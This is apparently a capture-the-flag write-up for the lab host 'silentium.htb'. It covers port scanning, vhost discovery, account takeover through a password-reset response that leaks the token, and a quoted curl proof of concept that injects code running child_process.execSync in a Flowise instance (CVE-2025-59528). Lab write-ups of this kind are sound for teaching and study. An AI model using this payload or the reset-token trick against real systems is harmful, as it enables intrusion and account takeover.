
port scanning

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-10 21:03 +0530
Nmap scan report for 10.129.245.103
Host is up (0.97s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.87 seconds

```

next we fuzz for virtual hosts for silentium.htb

Found a virtual host : 
```text
staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 497ms]
```

At staging.silentium.htb
![](./assets/README-2026-08-10_21-19-48.webp)

Few legit users can be assumed from 
![](./assets/README-2026-08-10_21-22-17.webp)


The valid email is ben@silentium.htb. 

There is reset token flaw in the forgot-password mechanism 

The response for the forgot-password contains the reset token itself and we can use it to change the password of ben and get in as ben.

![](./assets/README-2026-08-10_21-30-11.webp)

We use this token  to reset the admin password.
![](./assets/README-2026-08-10_21-31-02.webp)


it takes us to a flowise ai dashboard.

the version is 
![](./assets/README-2026-08-10_21-32-19.webp)


Searching for any known CVE's for this particular version we get a 'CVE-2025-59528' which is RCE.

References: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p

We get a PoC

```bash
curl -X POST http://localhost:3000/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer tmY1fIjgqZ6-nWUuZ9G7VzDtlsOiSZlDZjFSxZrDd0Q" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"echo !!RCE-OK!! >/tmp/RCE.txt\");return 1;})()})"
    }
  }'
```

